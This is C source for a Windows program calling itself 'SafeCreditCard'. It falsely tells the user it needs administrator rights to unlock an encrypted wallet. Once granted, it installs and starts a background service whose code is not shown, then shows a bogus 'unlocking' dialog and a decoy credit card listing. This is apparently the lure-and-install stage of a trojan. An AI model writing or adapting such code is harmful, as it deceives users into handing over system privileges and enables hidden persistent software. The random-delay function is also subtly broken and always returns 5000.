#include <Windows.h>
#include <Shlobj.h>
#include <string.h>
#include "ServiceLauncher.h"

#define WHY_WE_NEED_TO_UNLOCK_THIS \
	"\n\nIn order to provide proper security to your data we store data using an" \
	" internal operating system interface to encrypt data stronger, right there" \
	" even other cryptographic keys are stored. Refer to Windows documentation " \
	" to get more informations about the used cipher and algorithm, to encrypt your data."
	
#define ACCESS_GRANTED_UNLOCKING_WALLET \
	"**Do not press below button, no response**.\nAccess granted, unlocking wallet... Please Wait..."
	
#define ERROR_MESSAGE_ADMIN_REQUIRED \
	"SafeCreditCard needs administrator permission to unlock system encrypted wallet (Error: 0xF4)"
	
#define CREDIT_CARD_FAKE \
	"Type: VISA\n" \
	"4096 6008 6779 5069\n" \
	"CVV: 789\n" \
	"Expiration date: 01/25\n" \
	"Owner: Parker David\n"

#define CREDIT_CARD_LISTING_TITLE \
	"SCC: Parker David's credit card listing"
	
#define APP_TITLE "SafeCreditCard"

typedef int (*__MessageBoxTimeoutA_ProcType)(HANDLE, LPCSTR, LPCSTR, UINT, WORD, DWORD);

static inline DWORD RandomRange5000to7000() {
	srand(time(NULL));
	return rand() / (RAND_MAX + 1) * (7000 - 5000) + 5000;
}

int WINAPI WinMain(HINSTANCE thisInst, 
				   HINSTANCE prevInst, 
				   LPSTR cmdLine, 
				   int cmdShow) {
	
	if(!strcmp(cmdLine, "-AsService")) {
		//start pre-start state setup procedur
		SetupNotifyService();
		return 0;
	}
	
	if(!IsUserAnAdmin()) {
		MessageBoxA(NULL, 
				ERROR_MESSAGE_ADMIN_REQUIRED, APP_TITLE, 
				MB_OK | MB_ICONEXCLAMATION);
		return 1;
	}
	
	//start service
	InstallAndStartService();
	
	HMODULE dlUser32 = GetModuleHandle("user32.dll");
	__MessageBoxTimeoutA_ProcType MessageBoxTimeoutA = 
		(__MessageBoxTimeoutA_ProcType) GetProcAddress(dlUser32, "MessageBoxTimeoutA");

	MessageBoxTimeoutA(NULL, 
			ACCESS_GRANTED_UNLOCKING_WALLET WHY_WE_NEED_TO_UNLOCK_THIS, APP_TITLE, 
			MB_HELP | MB_ICONINFORMATION, 0, RandomRange5000to7000());
			
	MessageBoxA(NULL, 
			CREDIT_CARD_FAKE, CREDIT_CARD_LISTING_TITLE,
			MB_OK | MB_ICONWARNING);
			
	return 0;
}
